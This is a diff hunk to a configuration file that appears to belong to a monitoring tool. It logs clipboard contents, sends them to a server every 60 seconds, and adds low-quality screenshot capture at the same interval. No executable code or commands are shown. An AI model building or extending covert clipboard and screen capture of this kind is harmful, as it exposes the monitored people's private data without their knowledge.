@@ -22,3 +22,9 @@ CLIPBOARD_BATCH_SIZE = 20 # number of entries before flush
 CLIPBOARD_SEND_INTERVAL = 60 # seconds between sending logs to server
 CLIPBOARD_MIN_LENGTH = 2 # minimum clipboard content length
 CLIPBOARD_MAX_LENGTH = 1000 # maximum clipboard content length
+
+# Screenshot configuration
+SCREENSHOT_FOLDER = "data/screenshots/"
+SCREENSHOT_MAX_COUNT = 100 # maximum number of screenshots to keep in the folder
+SCREENSHOT_INTERVAL = 60  # seconds between screenshots
+SCREENSHOT_QUALITY = 10  # JPEG quality for compression (0-100)
